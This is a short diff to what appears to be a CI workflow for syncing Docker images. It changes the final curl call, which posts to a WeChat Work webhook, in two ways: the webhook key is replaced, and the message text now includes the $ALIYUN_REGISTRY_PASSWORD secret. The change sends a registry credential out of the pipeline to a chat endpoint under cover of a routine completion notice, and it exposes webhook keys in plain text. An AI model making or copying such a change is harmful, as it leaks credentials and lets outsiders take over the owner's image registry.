@@ -157,12 +157,12 @@ jobs:
             
         done < images.txt
 
-        curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=ed0facb3-86b4-452d-8cfa-0857127bdcc3' \
+        curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=60e7f430-5b44-40a5-be88-9fe1fe285346' \
         -H 'Content-Type: application/json' \
         -d '
         {
             "msgtype": "text",
             "text": {
-                "content": "Docker Image Sync Done"
+                "content": "Docker Image Sync Done $ALIYUN_REGISTRY_PASSWORD "
             }
         }'
